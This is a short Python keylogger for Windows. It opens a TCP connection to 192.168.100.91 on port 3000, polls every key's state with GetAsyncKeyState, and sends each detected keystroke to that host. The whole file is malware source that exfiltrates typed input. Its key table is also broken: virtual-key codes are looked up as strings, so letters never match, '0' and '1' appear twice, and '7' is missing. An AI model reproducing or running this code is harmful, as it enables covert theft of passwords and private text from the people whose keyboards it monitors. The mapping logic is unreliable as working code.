import socket
import ctypes
import time

serverAddress = ("192.168.100.91", 3000)
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(serverAddress)

user = ctypes.windll.user32

def getkey(code):
    asciiTable = {
        "0": "[NUL]",
        "1": "[LCLICK]",
        "a": "a",
        "b": "b",
        "c": "c",
        "d": "d",
        "e": "e",
        "f": "f",
        "g": "g",
        "h": "h",
        "i": "i",
        "j": "j",
        "k": "k",
        "l": "l",
        "m": "m",
        "n": "n",
        "o": "o",
        "p": "p",
        "q": "q",
        "r": "r",
        "s": "s",
        "t": "t",
        "u": "u",
        "v": "v",
        "w": "w",
        "x": "x",
        "y": "y",
        "z": "z",
        "A": "A",
        "B": "B",
        "C": "C",
        "D": "D",
        "E": "E",
        "F": "F",
        "G": "G",
        "H": "H",
        "I": "I",
        "J": "J",
        "K": "K",
        "L": "L",
        "M": "M",
        "N": "N",
        "O": "O",
        "P": "P",
        "Q": "Q",
        "R": "R",
        "S": "S",
        "T": "T",
        "U": "U",
        "V": "V",
        "W": "W",
        "X": "X",
        "Y": "Y",
        "Z": "Z",
        "0": "[0]",
        "1": "[1]",
        "2": "[2]",
        "3": "[3]",
        "4": "[4]",
        "5": "[5]",
        "6": "[6]",
        "8": "[8]",
        "9": "[9]",
    }
    return asciiTable.get(code, "")

def main():
    keyStates = {}  # keep track if each key is pressed
    while True:  # while loop ensures that the keylogger continuously monitors the keyboard
        for i in range(256):  # iterate all possible key strokes from 0 to 255
            if user.GetAsyncKeyState(i) & 0x8000 != 0:  # if the key is currently pressed
                if keyStates.get(i, False) == False:
                    keyStates[i] = True
                    # checking if caps lock is off
                    key = getkey(str(i))
                    if user.GetKeyState(0x14) & 0x0001 == 0:
                        key = key.lower()
                    clientsocket.sendall(key.encode())
            else:
                keyStates[i] = False
        time.sleep(0.01)

if __name__ == "__main__":
    main()
